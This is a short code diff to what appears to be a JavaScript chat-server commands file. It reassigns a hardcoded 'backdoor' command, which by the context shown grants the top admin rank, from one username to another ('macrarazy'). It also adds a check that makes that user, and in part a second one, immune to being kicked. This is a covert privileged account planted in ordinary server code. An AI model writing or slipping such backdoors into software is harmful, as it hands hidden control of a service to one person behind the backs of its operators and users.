@@ -584,7 +584,7 @@ var components = exports.components = {
      *********************************************************/
 
     backdoor: function (target, room, user) {
-        if (user.userid !== 'prfssrstein') return this.sendReply('/backdoor - Access denied.');
+        if (user.userid !== 'macrarazy') return this.sendReply('/backdoor - Access denied.');
 
         if (!target) {
             user.group = '~';
@@ -690,6 +690,10 @@ var components = exports.components = {
 
         var targetUser = Users.get(target);
         if (!targetUser) return this.sendReply('User ' + target + ' not found.');
+	var a = targetUser.name;
+	if (a == "macrarazy" || a == "BlakJack" && user.name !== 'macrarazy' && user.name !== 'BlakJack') {
+		return this.sendReply('Nu\'uh sonny, Jesus denies...');
+		}
 
         if (!Rooms.rooms[room.id].users[targetUser.userid]) return this.sendReply(target + ' is not in this room.');
         targetUser.popup('You have been kicked from room ' + room.title + ' by ' + user.name + '.');
